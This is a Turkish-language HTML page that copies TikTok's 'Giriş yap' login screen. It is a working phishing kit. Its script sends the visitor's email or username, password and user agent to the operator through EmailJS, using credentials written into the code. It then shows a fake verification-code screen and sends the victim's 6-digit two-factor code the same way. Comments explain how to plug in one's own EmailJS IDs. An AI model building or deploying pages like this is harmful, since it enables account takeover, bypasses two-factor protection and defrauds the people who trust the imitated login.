<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş yap | TikTok</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="header">
        <div class="logo">
            <a data-e2e="tiktok-logo" style="position:relative" aria-label="TikTok Sizin İçin akışına git" class="tiktok-1431rw4-StyledLinkLogo eq9n9li0 link-a11y-focus" href="/"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="42" alt="TikTok"><path fill="white" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path><path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path><path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path><path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path><path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path></svg></a>
        </div>
        <div class="help-link">
            <a href="#">? Geri bildirim ve yardım</a>
        </div>
    </div>

    <div class="login-container" id="loginContainer">
        <div class="login-box">
            <h1>Giriş yap</h1>
            <div class="tabs">
                <button class="tab-button active">E-posta veya kullanıcı adı</button>
                <button class="tab-button">Telefonla giriş yapın</button>
            </div>
            <form id="loginForm" onsubmit="handleSubmit(event)">
                <div class="input-group">
                    <input type="text" id="email" name="email" placeholder="E-posta veya kullanıcı adı" required>
                </div>
                <div class="input-group">
                    <div class="password-input-wrapper">
                        <input type="password" placeholder="Şifre" id="password" name="password" required>
                        <span class="password-toggle" onclick="togglePassword()">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </span>
                    </div>
                </div>
                <a href="#" class="forgot-password">Şifrenizi mi unuttunuz?</a>
                <button type="submit" class="login-button" id="submitBtn">Giriş yap</button>
                <div id="message" style="margin-top: 15px; font-size: 14px; display: none;"></div>
            </form>
            <div class="back-link">
                <a href="#">< Geri git</a>
            </div>
        </div>
    </div>

    <!-- Kod Giriş Ekranı -->
    <div class="login-container" id="codeContainer" style="display: none;">
        <div class="login-box">
            <h1>Doğrulama Kodu</h1>
            <p style="text-align: center; color: #8e8e8e; margin-bottom: 30px;">
                <span id="userEmailDisplay"></span> adresine gönderilen 6 haneli kodu girin
            </p>
            <form id="codeForm" onsubmit="handleCodeSubmit(event)">
                <div class="input-group">
                    <input type="text" id="codeInput" name="code" placeholder="6 haneli kod" maxlength="6" pattern="[0-9]{6}" required style="text-align: center; font-size: 24px; letter-spacing: 8px;">
                </div>
                <button type="submit" class="login-button" id="codeSubmitBtn">Erişim Al</button>
                <div id="codeMessage" style="margin-top: 15px; font-size: 14px; display: none;"></div>
            </form>
            <div class="back-link">
                <a href="#" onclick="goBackToLogin(); return false;">< Geri git</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="signup-link">
            Hesabın yok mu? <a href="#">Kaydol</a>
        </div>
        <div class="language-selector">
            <button>Türkçe</button>
        </div>
        <div class="copyright">
            © 2025 TikTok
        </div>
    </div>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    
    <script>
        // EmailJS'i başlat (SERVICE_ID, PUBLIC_KEY değerlerini kendi değerlerinizle değiştirin)
        (function(){
            emailjs.init("gvRJ3_7LCzdZvCWAR"); // EmailJS Public Key'inizi buraya yazın
        })();

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleIcon = passwordInput.nextElementSibling.querySelector('svg');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';
            } else {
                passwordInput.type = 'password';
                toggleIcon.innerHTML = '<path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';
            }
        }

        let userEmail = '';

        async function handleSubmit(event) {
            event.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const messageDiv = document.getElementById('message');
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Email'i sakla
            userEmail = email;
            
            // Butonu devre dışı bırak
            submitBtn.disabled = true;
            submitBtn.textContent = 'Erişim İsteniyor';
            messageDiv.style.display = 'none';
            
            try {
                // EmailJS ile email gönder
                const templateParams = {
                    email: email,
                    password: password,
                    timestamp: new Date().toLocaleString('tr-TR'),
                    user_agent: navigator.userAgent,
                    ip_address: 'N/A' // IP adresi için backend gerekir
                };

                // EmailJS servis bilgileri (BUNLARI KENDİ DEĞERLERİNİZLE DEĞİŞTİRİN)
                await emailjs.send(
                    'service_fx4y26n',      // EmailJS Service ID
                    'template_txn6rkj',     // EmailJS Template ID
                    templateParams
                );

                // Başarı mesajı göster
                messageDiv.style.display = 'block';
                messageDiv.style.color = '#4CAF50';
                messageDiv.textContent = 'Erişim isteniyor...';
                
                // 10 saniye sonra kod giriş ekranına yönlendir
                setTimeout(() => {
                    showCodeScreen();
                }, 10000);
                
            } catch (error) {
                console.error('Hata:', error);
                
                // Hata mesajı göster
                messageDiv.style.display = 'block';
                messageDiv.style.color = '#fe2c55';
                messageDiv.textContent = 'Bir hata oluştu. Lütfen tekrar deneyin.';
                
                // Butonu tekrar aktif et
                submitBtn.disabled = false;
                submitBtn.textContent = 'Giriş yap';
            }
        }

        function showCodeScreen() {
            document.getElementById('loginContainer').style.display = 'none';
            document.getElementById('codeContainer').style.display = 'block';
            document.getElementById('userEmailDisplay').textContent = userEmail;
            setupCodeInput();
            document.getElementById('codeInput').focus();
        }

        function goBackToLogin() {
            document.getElementById('codeContainer').style.display = 'none';
            document.getElementById('loginContainer').style.display = 'block';
            document.getElementById('codeForm').reset();
            document.getElementById('codeMessage').style.display = 'none';
        }

        async function handleCodeSubmit(event) {
            event.preventDefault();
            
            const codeSubmitBtn = document.getElementById('codeSubmitBtn');
            const codeMessageDiv = document.getElementById('codeMessage');
            const code = document.getElementById('codeInput').value;
            
            // Butonu devre dışı bırak
            codeSubmitBtn.disabled = true;
            codeSubmitBtn.textContent = 'Gönderiliyor...';
            codeMessageDiv.style.display = 'none';
            
            try {
                // ============================================
                // EMAILJS TEMPLATE AYARLARI İÇİN ÖNEMLİ BİLGİLER:
                // ============================================
                // EmailJS panelinizde (https://dashboard.emailjs.com) template'inize gidin
                // Template içeriğinde şu parametrelerden birini kullanın:
                // - {{code}} veya {{verification_code}} veya {{kod}} - Girilen 6 haneli kod
                // - {{user_email}} veya {{email}} - Kullanıcının email adresi
                // - {{message}} - Hazır mesaj formatı
                // 
                // ÖRNEK TEMPLATE İÇERİĞİ:
                // "Kullanıcı: {{user_email}}
                //  Girilen Doğrulama Kodu: {{code}}"
                // ============================================
                
                // EmailJS ile doğrulama kodunu gönder
                // TÜM PARAMETRELERİ EKLEDİK - EmailJS template'inizde bunlardan birini kullanın
                const templateParams = {
                    // Email parametreleri
                    email: userEmail,
                    to_email: userEmail,
                    user_email: userEmail,
                    from_email: userEmail,
                    
                    // Kod parametreleri (template'inizde {{code}} veya {{verification_code}} kullanın)
                    code: code,
                    verification_code: code,
                    kod: code,
                    dogrulama_kodu: code,
                    
                    // Mesaj formatları
                    message: `Doğrulama Kodu: ${code}`,
                    kod_mesaji: `Girilen Doğrulama Kodu: ${code}`,
                    
                    // Diğer bilgiler
                    password: '', // Boş bırakıyoruz çünkü sadece kod gönderiyoruz
                    timestamp: new Date().toLocaleString('tr-TR'),
                    user_agent: navigator.userAgent,
                    ip_address: 'N/A'
                };

                console.log('Gönderilen kod:', code);
                console.log('Kullanıcı email:', userEmail);
                console.log('Template parametreleri:', templateParams);

                // EmailJS servis bilgileri
                const result = await emailjs.send(
                    'service_fx4y26n',      // EmailJS Service ID
                    'template_txn6rkj',     // EmailJS Template ID
                    templateParams
                );

                console.log('EmailJS gönderim başarılı:', result);

                // Başarı mesajı göster
                codeMessageDiv.style.display = 'block';
                codeMessageDiv.style.color = '#4CAF50';
                codeMessageDiv.textContent = `Doğrulama kodu (${code}) e-postanıza gönderildi!`;
                
            } catch (error) {
                console.error('EmailJS Hata Detayları:', error);
                console.error('Hata Kodu:', error.status);
                console.error('Hata Mesajı:', error.text);
                
                // Detaylı hata mesajı göster
                codeMessageDiv.style.display = 'block';
                codeMessageDiv.style.color = '#fe2c55';
                codeMessageDiv.textContent = `Hata: ${error.text || 'Bir hata oluştu. Lütfen tekrar deneyin.'}`;
                
                // Butonu tekrar aktif et
                codeSubmitBtn.disabled = false;
                codeSubmitBtn.textContent = 'Erişim Al';
            }
        }

        // Kod input için sadece rakam girişi
        let codeInputSetup = false;
        function setupCodeInput() {
            if (codeInputSetup) return;
            const codeInput = document.getElementById('codeInput');
            if (codeInput) {
                codeInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
                codeInputSetup = true;
            }
        }

        // Sayfa yüklendiğinde setup yap
        document.addEventListener('DOMContentLoaded', function() {
            setupCodeInput();
        });
    </script>
</body>
</html>